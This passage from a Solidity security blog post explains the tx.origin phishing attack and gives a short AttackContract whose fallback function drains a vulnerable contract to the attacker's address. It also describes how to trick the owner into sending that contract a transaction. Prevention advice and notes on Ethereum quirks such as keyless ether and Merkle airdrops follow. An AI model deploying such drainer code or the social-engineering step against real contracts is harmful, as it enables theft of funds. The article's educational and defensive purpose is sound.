<p>Notice that on line [11] this contract authorises the <code>withdrawAll()</code> function using <code>tx.origin</code>. This contract allows for an attacker to create an attacking contract of the form,</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-keyword">import</span> <span class="hljs-string">"Phishable.sol"</span>;

<span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">AttackContract</span> </span>{

    Phishable phishableContract;
    <span class="hljs-built_in">address</span> attacker; <span class="hljs-comment">// The attackers address to receive funds.</span>

    <span class="hljs-function"><span class="hljs-literal">constructor</span> (<span class="hljs-params">Phishable _phishableContract, <span class="hljs-built_in">address</span> _attackerAddress</span>) </span>{
        phishableContract = _phishableContract;
        attacker = _attackerAddress;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) <span class="hljs-title">payable</span> </span>{
        phishableContract.withdrawAll(attacker);
    }
}
</pre></div>

<p>To utilise this contract, an attacker would deploy it, and then convince the owner of the <code>Phishable</code> contract to send this contract some amount of ether. The attacker may disguise this contract as their own private address and social engineer the victim to send some form of transaction to the address. The victim, unless being careful, may not notice that there is code at the attacker's address, or the attacker may pass it off as being a multisignature wallet or some advanced storage wallet (remember
source code of public contracts is not available by default).</p>
<p>In any case, if the victim sends a transaction (with enough gas) to the <code>AttackContract</code> address, it will invoke the fallback function, which in turn calls the <code>withdrawAll()</code> function of the <code>Phishable</code> contract, with the parameter <code>attacker</code>. This will result in the withdrawal of all funds from the <code>Phishable</code> contract to the <code>attacker</code> address. This is because the address that first initialised the call was the victim (i.e. the <code>owner</code> of the <code>Phishable</code> contract). Therefore, <code>tx.origin</code> will be equal to <code>owner</code> and the <code>require</code> on line [11] of the <code>Phishable</code> contract will pass.</p>
<h3 id="tx-origin-prev">Preventative Techniques</h3>

<p><code>tx.origin</code> should not be used for authorisation in smart contracts. This isn't to say that the <code>tx.origin</code> variable should never be used. It does have some legitimate use cases in smart contracts. For example, if one wanted to deny external contracts from calling the current contract, they could implement a <code>require</code> of the from <code>require(tx.origin == msg.sender)</code>. This prevents intermediate contracts being used to call the current contract, limiting the contract to regular code-less addresses.</p>
<h3 id="tx-origin-example">Real-World Example: Not Known</h3>

<p>I do not know of any publicised exploits of this form in the wild.</p>
<h2 id="ethereum-quirks">Ethereum Quirks</h2>

<p>I intend to populate this section with various interesting quirks that get discovered by the community. These are kept in this blog as they may aid in smart contract development if one were to utilize these quirks in practice.</p>
<h3 id="keyless-eth">Keyless Ether</h3>

<p>Contract addresses are deterministic, meaning that they can be calculated prior to actually creating the address. This is the case for addresses creating contracts and also for contracts spawning other  contracts. In fact, a created contract's address is determined by:</p>
<p><code>keccak256(rlp.encode([&lt;account_address&gt;, &lt;transaction_nonce&gt;])</code></p>
<p>Essentially, a contract's address is just the <code>keccak256</code> hash of the account that created it concatenated with the accounts transaction nonce<sup id="fnref:2"><a class="footnote-ref" href="https://blog.sigmaprime.io/solidity-security.html#fn:2">2</a></sup>. The same is true for contracts, except contracts nonce's start at <code>1</code> whereas address's transaction nonce's start at <code>0</code>.</p>
<p>This means that given an Ethereum address, we can calculate all the possible contract addresses that this address can spawn. For example, if the address <code>0x123000...000</code> were to create a contract on its 100th transaction, it would create the contract address <code>keccak256(rlp.encode[0x123...000, 100])</code>, which would give the contract address, <code>0xed4cafc88a13f5d58a163e61591b9385b6fe6d1a</code>.</p>
<p>What does this all mean? This means that you can send ether to a pre-determined address (one which you don't own the private key to, but know that one of your accounts can create a contract to). You can send ether to that address and then retrieve the ether by later creating a contract which gets spawned over the same address. The constructor could be used to return all your pre-sent ether. Thus if someone were to obtain all your Ethereum private keys, it would be difficult for the attacker to discover that your Ethereum addresses also have access to this <em>hidden</em> ether. In fact, if the attacker spent too many transaction such that the nonce required to access your ether is used, it is impossible to recover your hidden ether.</p>
<p>Let me clarify this with a contract.</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">KeylessHiddenEthCreator</span> </span>{
    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> currentContractNonce = <span class="hljs-number">1</span>; <span class="hljs-comment">// keep track of this contracts nonce publicly (it's also found in the contracts state)</span>

    <span class="hljs-comment">// determine future addresses which can hide ether.</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">futureAddresses</span>(<span class="hljs-params"><span class="hljs-built_in">uint8</span> nonce</span>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">address</span></span>) </span>{
        <span class="hljs-keyword">if</span>(nonce == <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">address</span>(<span class="hljs-built_in">keccak256</span>(<span class="hljs-number">0xd6</span>, <span class="hljs-number">0x94</span>, <span class="hljs-keyword">this</span>, <span class="hljs-number">0x80</span>));
        }
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">address</span>(<span class="hljs-built_in">keccak256</span>(<span class="hljs-number">0xd6</span>, <span class="hljs-number">0x94</span>, <span class="hljs-keyword">this</span>, nonce));
    <span class="hljs-comment">// need to implement rlp encoding properly for a full range of nonces</span>
    }

    <span class="hljs-comment">// increment the contract nonce or retrieve ether from a hidden/key-less account</span>
    <span class="hljs-comment">// provided the nonce is correct</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">retrieveHiddenEther</span>(<span class="hljs-params"><span class="hljs-built_in">address</span> beneficiary</span>) <span class="hljs-title">public</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">address</span></span>) </span>{
    currentContractNonce +=<span class="hljs-number">1</span>;
       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> RecoverContract(beneficiary);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) <span class="hljs-title">payable</span> </span>{} <span class="hljs-comment">// Allow ether transfers (helps for playing in remix)</span>
}

<span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">RecoverContract</span> </span>{
    <span class="hljs-function"><span class="hljs-literal">constructor</span>(<span class="hljs-params"><span class="hljs-built_in">address</span> beneficiary</span>) </span>{
        <span class="hljs-built_in">selfdestruct</span>(beneficiary); <span class="hljs-comment">// don't deploy code. Return the ether stored here to the beneficiary.</span>
    }
 }
</pre></div>

<p>This contract allows you to store keyless ether (relatively safely, in the sense you can't accidentally miss the nonce)<sup id="fnref:3"><a class="footnote-ref" href="https://blog.sigmaprime.io/solidity-security.html#fn:3">3</a></sup>. The <code>futureAddresses()</code> function can be used to calculate the first 127 contract addresses that this contract can spawn, by specifying the <code>nonce</code>. If you send ether to one of these addresses, it can be later recovered by calling the <code>retrieveHiddenEther()</code> enough times. For example, if you choose <code>nonce=4</code> (and send ether to the associated address), you will need to call <code>retrieveHiddenEther()</code> four times and it will recover the ether to the <code>beneficiary</code> address.</p>
<p>This can be done without a contract. You can send ether to addresses that can be created from one of your standard Ethereum accounts and recover it later, at the correct nonce. Be careful however, if you accidentally surpass the transaction nonce that is required to recover your ether, your funds will be lost forever.</p>
<p>For more information on some more advanced tricks you can do with this quirk, I recommend reading <a href="http://martin.swende.se/blog/Ethereum_quirks_and_vulns.html">Martin Swende's post</a>.</p>
<h3 id="one-time-addresses">One Time Addresses</h3>

<p>Ethereum transaction signing uses the Elliptic Curve Digital Signing Algorithm (ECDSA). Conventionally, in order to send a verified transaction on Ethereum, you sign a message with your Ethereum private key, which authorises spending from your account. In slightly more detail, the message that you sign is the components of the Ethereum transaction, specifically, the <code>to</code>, <code>value</code>, <code>gas</code>, <code>gasPrice</code>, <code>nonce</code> and <code>data</code> fields. The result of an Ethereum signature is three numbers, <code>v</code>, <code>r</code> and <code>s</code>. I won't go into detail about what each of these represent, instead I refer the interested readers to the <a href="https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm">ECDSA wiki page</a> (which describes <code>r</code> and <code>s</code>) and the <a href="https://ethereum.github.io/yellowpaper/paper.pdf">Ethereum Yellow Paper</a> (Appendix F - which describes <code>v</code>) and finally <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-155.md">EIP155</a> for the current use of <code>v</code>.</p>
<p>So we know that an Ethereum transaction signature consists of a message and the numbers <code>v</code>, <code>r</code> and <code>s</code>. We can check if a signature is valid, by using the message (i.e. transaction details), <code>r</code> and <code>s</code> to derive an Ethereum address. If the derived Ethereum address matches the <code>from</code> field of the transaction, then we know that <code>r</code> and <code>s</code> were created by someone who owns (or has access to) the private key for the <code>from</code> field and thus the signature is valid.</p>
<p>Consider now, that we don't own a private key, but instead make up values for <code>r</code> and <code>s</code> for an arbitrary transaction. Consider we have a transaction, with the parameters:</p>
<div class="highlight"><pre class="hljs language-css">{<span class="hljs-selector-tag">to</span>: <span class="hljs-string">"0xa9e"</span>, value: <span class="hljs-number">10</span>e18, nonce: <span class="hljs-number">0</span>}
</pre></div>

<p>I've ignored the other parameters. This transaction will send 10 ether to the <code>0xa9e</code> address. Now let's say we make up some numbers <code>r</code> and <code>s</code> (these have specific ranges) and a <code>v</code>. If we derive the Ethereum address related to these made up numbers we will get a random Ethereum address, let's call it <code>0x54321</code>. Knowing this address, we could send 10 ether to the <code>0x54321</code> address (without owning the private key for the address). At any point in the future, we could send the transaction,</p>
<div class="highlight"><pre class="hljs language-applescript">{<span class="hljs-keyword">to</span>: <span class="hljs-string">"0xa9e"</span>, value: <span class="hljs-number">10e18</span>, nonce: <span class="hljs-number">0</span>, <span class="hljs-keyword">from</span>: <span class="hljs-string">"0x54321"</span>}
</pre></div>

<p>along with the signature, i.e. the <code>v</code>, <code>r</code> and <code>s</code> we made up. This will be a valid transaction, because the derived address will match our <code>from</code> field. This allows us to spend our money from this random address (<code>0x54321</code>) to the address we chose <code>0xa9e</code>. Thus we have managed to store ether in an address that we do not have the private key and used a one-time transaction to recover the ether.</p>
<p>This quirk can also be used to send ether to a large number of people in a trustless manner, as Nick Johnson describes in <a href="https://medium.com/@weka/how-to-send-ether-to-11-440-people-187e332566b7">How to send Ether to 11,440 people</a>.</p>
<h3 id="single-transaction-airdrops">Single Transaction Airdrops</h3>

<p>An Airdrop refers to the process of distributing tokens amongst a large
group of people. Traditionally, airdrops have been processed via a large number
of transactions where each transaction updates either a single or a batch of
user's balances. This can be costly and strenuous on the Ethereum blockchain.
There is an alternative method, in which many users balances can be credited
with tokens using a single transaction.</p>
<p>This technique is explained in more detail by its proposer, RicMoo in his post:
<a href="https://blog.ricmoo.com/merkle-air-drops-e6406945584d">Merkle Air-Drops: Make Love, Not War</a>.</p>
<p>The idea is to create a <a href="https://en.wikipedia.org/wiki/Merkle_tree">Merkle Tree</a>
which contains (as leaf nodes) all the addresses and balances of users to be credited tokens.
This will be done off-chain. The merkle tree can be given out
publicly (again off-chain). A smart contract can then be created containing the
root hash of the merkle tree which allows users to submit <a href="https://www.quora.com/Cryptography-How-does-a-Merkle-proof-actually-work">merkle-proofs</a> to obtain
their tokens. Thus a single transaction (the one used to create the contract,
    or to simply store the Merkle tree root hash), allows all credited users to redeem
their airdropped tokens.</p>
<p>RicMoo in his <a href="https://blog.ricmoo.com/merkle-air-drops-e6406945584d">post</a> also provides an example of a function which can accept Merkle Proofs
and credit a user's balance:</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">redeem</span>(<span class="hljs-params"><span class="hljs-built_in">uint256</span> index, <span class="hljs-built_in">address</span> recipient,
                <span class="hljs-built_in">uint256</span> amount, <span class="hljs-built_in">bytes32</span>[] merkleProof</span>) <span class="hljs-title">public</span> </span>{

    <span class="hljs-comment">// Make sure this has not been redeemed</span>
    <span class="hljs-built_in">uint256</span> redeemedBlock = _redeemed[index / <span class="hljs-number">256</span>];
    <span class="hljs-built_in">uint256</span> redeemedMask = (<span class="hljs-built_in">uint256</span>(<span class="hljs-number">1</span>) &lt;&lt; <span class="hljs-built_in">uint256</span>(index % <span class="hljs-number">256</span>));
    <span class="hljs-built_in">require</span>((redeemedBlock &amp; redeemedMask) == <span class="hljs-number">0</span>);

    <span class="hljs-comment">// Mark it as redeemed (if we fail, we revert)</span>
    _redeemed[index / <span class="hljs-number">256</span>] = redeemedBlock | redeemedMask;

    <span class="hljs-comment">// Compute the merkle root from the merkle proof</span>
    <span class="hljs-built_in">bytes32</span> node = <span class="hljs-built_in">keccak256</span>(index, recipient, amount);
    <span class="hljs-built_in">uint256</span> path = index;
    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">uint16</span> i = <span class="hljs-number">0</span>; i &lt; merkleProof.length; i++) {
        <span class="hljs-keyword">if</span> ((path &amp; <span class="hljs-number">0x01</span>) == <span class="hljs-number">1</span>) {
            node = <span class="hljs-built_in">keccak256</span>(merkleProof[i], node);
        } <span class="hljs-keyword">else</span> {
            node = <span class="hljs-built_in">keccak256</span>(node, merkleProof[i]);
        }
        path /= <span class="hljs-number">2</span>;
    }

    <span class="hljs-comment">// Check the resolved merkle proof matches our merkle root</span>
    <span class="hljs-built_in">require</span>(node == _rootHash);

    <span class="hljs-comment">// Redeem!</span>
    _balances[recipient] += amount;
    _totalSupply += amount;
    Transfer(<span class="hljs-number">0</span>, recipient, amount);
}
</pre></div>

<p>This function could be built into a token contract to allow future airdrops.
The only transaction required to credit all user's balances, would be the
transaction that sets the Merkle tree root.</p>
<h2 id="hacks">List of Interesting Crypto Related Hacks/Bugs</h2>

<ul>
<li><a href="https://medium.com/spankchain/we-got-spanked-what-we-know-so-far-d5ed3a0f38fe">SpankChain</a></li>
<li><a href="https://www.theregister.co.uk/2017/07/18/coindash_hack/">CoinDash</a></li>
<li><a href="https://www.reddit.com/r/ethereum/comments/74d3dc/smartbillions_lottery_contract_just_got_hacked/">SmartBillions</a></li>
<li><a href="https://steemit.com/cryptocurrency/@barrydutton/breaking-the-biggest-canadian-coin-exchange-quadrigacx-loses-67-000-usdeth-due-to-coding-error-funds-locked-in-an-executable">Exchange Didn't add "0x" to payload</a></li>
</ul>
<div class="footnote">
<hr>
<ol>
<li id="fn:1">
<p>This code was modified from <a href="https://github.com/web3j/web3j/blob/master/codegen/src/test/resources/solidity/fibonacci/Fibonacci.sol">web3j</a>&nbsp;<a class="footnote-backref" href="https://blog.sigmaprime.io/solidity-security.html#fnref:1" title="Jump back to footnote 1 in the text"></a></p>
</li>
<li id="fn:2">
<p>A transaction nonce is like a transaction counter. It increments ever time a transaction is sent from your account.&nbsp;<a class="footnote-backref" href="https://blog.sigmaprime.io/solidity-security.html#fnref:2" title="Jump back to footnote 2 in the text"></a></p>
</li>
<li id="fn:3">
<p>Do not deploy this contract to store any real ether. It is for demonstrative purposes only. It has no inherent privileges, anyone can recover your ether if you deploy and use it.&nbsp;<a class="footnote-backref" href="https://blog.sigmaprime.io/solidity-security.html#fnref:3" title="Jump back to footnote 3 in the text"></a></p>
</li>
</ol>
</div>
          </section>


          <section class="post-footer" style="margin: 12rem 0 0;">
            <div class="post-share">
              <span class="post-info-label">Share</span>
              <a title="Twitter" aria-label="Twitter" class="twitter" href="https://twitter.com/share?text=Solidity%20Security:%20Comprehensive%20list%20of%20known%20attack%20vectors%20and%20common%20anti-patterns&amp;url=https://blog.sigmaprime.io/solidity-security.html" onclick="window.open(this.href, &#39;twitter-share&#39;, &#39;width=550,height=235&#39;);return false;">
                <i class="icon icon-twitter" aria-hidden="true"></i><span class="hidden">Twitter</span>
              </a>
              <a title="Facebook" aria-label="Facebook" class="facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.sigmaprime.io/solidity-security.html" onclick="window.open(this.href, &#39;facebook-share&#39;,&#39;width=580,height=296&#39;);return false;">
                <i class="icon icon-facebook" aria-hidden="true"></i><span class="hidden">Facebook</span>
              </a>
              <a title="LinkedIn" aria-label="LinkedIn" class="linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://blog.sigmaprime.io/solidity-security.html&amp;title=Solidity%20Security:%20Comprehensive%20list%20of%20known%20attack%20vectors%20and%20common%20anti-patterns" onclick="window.open(this.href, &#39;linkedin-share&#39;, &#39;width=930,height=720&#39;);return false;">
                <i class="icon icon-linkedin" aria-hidden="true"></i><span class="hidden">LinkedIn</span>
              </a>
              <a title="Email" aria-label="Email" class="email" href="mailto:?subject=Solidity%20Security:%20Comprehensive%20list%20of%20known%20attack%20vectors%20and%20common%20anti-patterns&amp;body=https://blog.sigmaprime.io/solidity-security.html">
                <i class="icon icon-mail" aria-hidden="true"></i><span class="hidden">Email</span>
              </a>
              <div class="clear"></div>
            </div>

            <aside class="post-tags">
<a href="https://blog.sigmaprime.io/tag/security/">security</a><a href="https://blog.sigmaprime.io/tag/informative/">informative</a>            </aside>

            <div class="clear"></div>

            <aside class="post-author">


                <figure class="post-author-avatar">
                  <img src="./Solidity Security_ Comprehensive list of known attack vectors and common anti-patterns_files/age.jpg" alt="Adrian Manning">
                </figure>
                <div class="post-author-bio">
                  <h4 class="post-author-name"><a href="https://blog.sigmaprime.io/author/age.html">Adrian Manning</a></h4>
                    <p class="post-author-about">Physicist turned blockchain scientist. An avid fan of the Ethereum community and the projects being built in the space.</p>
                    <span class="post-author-location"><i class="icon icon-location"></i> Sydney, Australia</span>
                  <!-- Social linkes in alphabet order. -->
                    <span class="post-author-github"><a target="_blank" href="https://github.com/AgeManning"><i class="icon icon-github"></i> GitHub</a></span>
                    <span class="post-author-twitter"><a target="_blank" href="https://twitter.com/AgeManning"><i class="icon icon-twitter"></i> Twitter</a></span>
                </div>
                <div class="clear"></div>
            </aside>

          </section>


          <aside class="post-nav">
            <div class="clear"></div>
          </aside>

        </div>
      </article>
    </main>
    <div class="nav-footer">
      <nav class="nav-wrapper" aria-label="Footer">
        <span class="nav-copy">Sigma Prime  2023
        </span>
        <span class="nav-credits">

        </span>
      </nav>
    </div>

  </section>

  <script src="./Solidity Security_ Comprehensive list of known attack vectors and common anti-patterns_files/jquery.min.js.download"></script>
  <script type="text/javascript" src="./Solidity Security_ Comprehensive list of known attack vectors and common anti-patterns_files/highlight.min.js.download"></script>
  <script type="text/javascript" src="./Solidity Security_ Comprehensive list of known attack vectors and common anti-patterns_files/jquery.fitvids.js.download"></script>
  <script type="text/javascript" src="./Solidity Security_ Comprehensive list of known attack vectors and common anti-patterns_files/script.js.download"></script>


  <!-- 	The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in article.html, but it needs to be included down here, after jQuery has already loaded. -->

<script>
  $(document).ready(function () {
    var viewport = $(window);
    var post = $('.post-content');
    // Responsive videos with fitVids
    post.fitVids();

    var mdSelector=".highlight pre";
    var rstSelector=".highlight pre";
    var selector=mdSelector;
    // Format code blocks and add line numbers
    function codestyling() {
      $(selector).each(function(i, e) {
        // Code highlight
        hljs.highlightElement(e);
        // No lines for plain text blocks
        if (!$(this).hasClass('language-text')) {
          var code = $(this);
          // Calculate amount of lines
          var lines = code.html().split(/\n(?!$)/g).length;
          var numbers = [];
          if (lines > 1) {
            lines++;
          }
          for (i = 1; i < lines; i++) {
            numbers += '<span class="line" aria-hidden="true">' + i + '</span>';
          }
          code.parent().append('<div class="lines">' + numbers + '</div>');
        }
      });
    }

    // Format code blocks only
    function codestylingWithoutLineNumbers() {
      $(selector).each(function(i, e) {
        // Code highlight
        hljs.highlightElement(e);
      });
    }

     codestylingWithoutLineNumbers();
    // Reading progress bar on window top
    function readingProgress() {
      var postBottom = post.offset().top + post.height();
      var viewportHeight = viewport.height();
      var progress = 100 - (((postBottom - (viewport.scrollTop() + viewportHeight) + viewportHeight / 3) / (postBottom - viewportHeight + viewportHeight / 3)) * 100);
      $('.progress-bar').css('width', progress + '%');
      (progress > 100) ? $('.progress-container').addClass('complete'): $('.progress-container').removeClass('complete');
    }
    readingProgress();
    // Trigger reading progress
    viewport.on({
      'scroll': function() {
        readingProgress();
      },
      'resize': function() {
        readingProgress();
      },
      'orientationchange': function() {
        readingProgress();
      }
    });

  });
</script>


</body></html>